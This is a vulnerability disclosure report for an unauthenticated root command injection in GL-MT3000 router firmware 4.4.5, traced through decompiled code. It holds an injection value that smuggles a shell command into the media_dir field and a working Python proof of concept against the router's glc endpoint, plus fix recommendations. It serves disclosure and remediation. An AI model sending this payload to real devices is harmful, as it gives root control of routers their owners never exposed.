Submission Date: 2026.5.11
Vendor: GL-MT3000
Version: 4.4.5
Firmware: openwrt-mt3000-4.4.5-0811-1691754744.tar
Download Link: https://dl.gl-inet.cn/router/mt3000/stable


An unauthenticated command injection vulnerability exists in the `/cgi-bin/glc` endpoint of the affected product. The `nas-web.so` plugin forwards the `set_proto_config` JSON request via libcurl HTTP POST to the local `gl_nas_sys` root daemon. The `gl_nas_sys` FTP protocol handler (`FUN_0045dc80`) extracts the `media_dir` parameter from the JSON payload and passes it unsanitized into two `snprintf()` + `system()` calls that construct shell commands wrapped in single quotes. An attacker can include a single quote (`'`) in `media_dir` to break out of the quoting context, inject shell metacharacters (`;`, `>`, `#`), and execute arbitrary commands as root.

The reported vulnerable flow is:

```text
Unauthenticated attacker
  -> POST /cgi-bin/glc
     {"object":"nas-web", "method":"set_proto_config",
      "args":{"protos":[{"name":"ftp","enable":1,
              "media_dir":"/x';<cmd>>/tmp/out 2>&1;#"}]}}

  -> /www/cgi-bin/glc
       json_unpack_ex → dlopen("nas-web.so") → dlsym("set_proto_config")
       // NO authentication check

  -> nas-web.so::set_proto_config_do1(args)
       json_str = json_dumps(args)
       // serializes JSON as-is — no parameter validation
       curl_post_manage_post(127.0.0.1, <port>,
           "/NAS_API_SET_PROTO_CONFIG", json_str)

  -> gl_nas_sys (root HTTP daemon)
       FUN_0042bd50: URI → route lookup → route_id = 0x61
       FUN_00440190 case 0x61: FUN_0043d340(srv, con, p_d)

  -> FUN_0043d340: parse protos array
       → proto.name == "ftp" (0x66 0x74 0x70) → FUN_0045dc80(proto_json)

  -> FUN_0045dc80 (FTP handler):
       pcVar6 = json_get_field(proto, "media_dir")  // → "/x';<cmd>>/tmp/out 2>&1;#"

       snprintf(buf, 0x200,
           "echo 'anon_root=/tmp/mountd%s' >> /etc/vsftpd.conf",
           pcVar6);
       system(buf);    // 💣 Sink 1

       snprintf(buf, 0x200,
           "mkdir -p /home/ftp;chmod 777 -R '/tmp/mountd%s'",
           pcVar6);
       system(buf);    // 💣 Sink 2

  -> /bin/sh -c:
       echo 'anon_root=/tmp/mountd/x'    ← single-quoted string ends here
       ;<cmd> > /tmp/out 2>&1            ← 💣 RCE
       ;#                                ← trailing template commented out
```

The `/www/cgi-bin/glc` entry point loads plugins with no authentication, no ACL, and no method allowlist:

![image-20260511224527349](./image-20260511224527349.png)

```c
// glc main() — no auth check
json_unpack_ex(body, "{s:s,s:s,s?o}",
    "object", &object,   // "nas-web"
    "method", &method,   // "set_proto_config"
    "args",   &args);    // {"protos":[...]}

snprintf(path, 0x80, "%s/%s.so", "/usr/lib/oui-httpd/rpc", object);
handle = dlopen(path, RTLD_NOW);
handler = dlsym(handle, method);       // resolves ANY exported symbol
handler(args, result);                 // calls with raw JSON args
```

The `nas-web.so` forwards the request transparently — `json_dumps()` serializes the args without any content inspection:

```c
// nas-web.so::set_proto_config_do1(args, result)
json_str = json_dumps(args, 256);      // serialize JSON as-is
curl_post_manage_post(
    127.0.0.1,                         // localhost
    <gl_nas_sys_port>,                 // daemon port
    "/NAS_API_SET_PROTO_CONFIG",       // route
    json_str);                         // raw JSON → no filtering
```

The `gl_nas_sys` route dispatcher maps the URI to case 0x61:

```c
// FUN_00440190 — route dispatcher
switch (route_id) {
    case 0x5f: return get_proto_config(...);
    case 0x61: return set_proto_config(...);   // ← NAS_API_SET_PROTO_CONFIG
    ...
}
```

The `FUN_0043d340` handler dispatches by protocol name — matching "ftp" byte-by-byte:

![image-20260511224504120](./image-20260511224504120.png)

```c
// FUN_0043d340 — SET_PROTO_CONFIG handler
protos_array = cJSON_GetObjectItem(body, "protos");
for each proto in protos_array:
    name = cJSON_GetStringValue(cJSON_GetObjectItem(proto, "name"));
    if (name[0:2] == "ft" && name[2] == 'p')    // "ftp"
        FUN_0045dc80(proto);                     // → FTP handler
    else if (name == "samba")
        FUN_0045dbb0(proto);                     // → Samba handler
    else if (name == "webdav")
        FUN_0045dee0(proto);                     // → WebDAV handler
```

The `FUN_0045dc80` FTP handler extracts `media_dir` and passes it directly into `system()` — no shell metacharacter filtering:

![image-20260511224455909](./image-20260511224455909.png)

```c
// FUN_0045dc80 — FTP proto config handler
item = json_get_field(json_obj, "media_dir");     // @ 0x00467dc0
pcVar6 = *(char **)(item + 0x20);                 // raw string from cJSON
// pcVar6 = "/x';<cmd>>/tmp/out 2>&1;#"

if (enable && pcVar6 != NULL && pcVar6[0] != '\0') {
    snprintf(buf, 0x200,
        "echo 'anon_root=/tmp/mountd%s' >> /etc/vsftpd.conf",
        pcVar6);                                   // %s = raw user input
    system(buf);                                    // 💣 Sink 1

    snprintf(buf, 0x200,
        "mkdir -p /home/ftp;chmod 777 -R '/tmp/mountd%s'",
        pcVar6);                                   // %s = raw user input
    system(buf);                                    // 💣 Sink 2
}
```

Key strings confirmed from the binary:

| Address | String |
|---------|--------|
| 0x0047c198 | `"mkdir -p /home/ftp;chmod 777 -R '/tmp/mountd%s'"` |
| 0x0047c3a8 | `"echo 'anon_root=/tmp/mountd%s' >> /etc/vsftpd.conf"` |

The single-quote escape mechanism:

```text
Normal:  media_dir = "codexp20"
         command  = echo 'anon_root=/tmp/mountdcodexp20' >> /etc/vsftpd.conf
         ✅ all characters inside single quotes are literal

Exploit: media_dir = "/x';<cmd>>/tmp/out 2>&1;#"
         command  = echo 'anon_root=/tmp/mountd/x';<cmd>>/tmp/out 2>&1;#' >> /etc/vsftpd.conf

         Shell parsing:
         ┌──────────────────────────────────────┐
         │ echo 'anon_root=/tmp/mountd/x'       │ ← single-quoted string closed
         ├──────────────────────────────────────┤
         │ ;                                     │ ← command separator
         │ <cmd> > /tmp/out 2>&1                 │ ← 💣 RCE
         │ ;                                     │ ← command separator
         │ #' >> /etc/vsftpd.conf                │ ← shell comment (ignored)
         └──────────────────────────────────────┘
```

The root cause spans three components:

| Component | Issue |
|-----------|-------|
| `/www/cgi-bin/glc` | No authentication, no method allowlist, any exported symbol callable |
| `nas-web.so` | Transparent JSON proxy — no input validation |
| `gl_nas_sys FUN_0045dc80` | `snprintf` single-quoted template → `system()` — no `'` filtering |

The exploitation is shown below.

![image-20260511224358888](./image-20260511224358888.png)

```python
#!/usr/bin/env python3
import json, urllib.request, ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

dev_name = "/codexp20';id>/tmp/nas_proto_poc 2>&1;#"

body = {
    "object": "nas-web",
    "method": "set_proto_config",
    "args": {
        "protos": [{
            "name": "ftp",
            "enable": 1,
            "media_dir": dev_name
        }]
    }
}

req = urllib.request.Request(
    "https://192.168.8.1/cgi-bin/glc",
    data=json.dumps(body).encode(),
    headers={"Content-Type": "application/json"},
    method="POST",
)
print(urllib.request.urlopen(req, timeout=10, context=ctx).read().decode())
print("[+] check /tmp/nas_proto_poc on target")
```

**Fix recommendations:**

| Priority | Component | Action |
|----------|-----------|--------|
| P0 | `gl_nas_sys` FUN_0045dc80 | Replace `system()` with direct file I/O + `chmod()` |
| P0 | `gl_nas_sys` FUN_0045dc80 | Reject `media_dir` containing `'` `;` `\|` `` ` `` `$()` `#` |
| P1 | `nas-web.so` | Validate `media_dir` against safe pattern `/^[a-zA-Z0-9/_-.]+$/` |
| P1 | `/www/cgi-bin/glc` | Add authentication; implement method allowlist |
